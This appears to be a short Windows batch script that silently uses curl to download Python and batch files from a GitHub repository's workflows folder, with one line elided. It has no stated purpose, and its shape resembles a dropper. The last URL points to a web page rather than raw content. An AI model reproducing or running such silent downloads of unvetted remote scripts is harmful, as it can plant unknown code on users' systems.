@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/Ladav279403/huop/refs/heads/main/.github/workflows/setup.py
...
curl -s -L -o show.bat https://raw.githubusercontent.com/Ladav279403/huop/refs/heads/main/.github/workflows/show.bat
curl -s -L -o loop.bat https://github.com/Ladav279403/huop/blob/main/.github/workflows/loop.bat
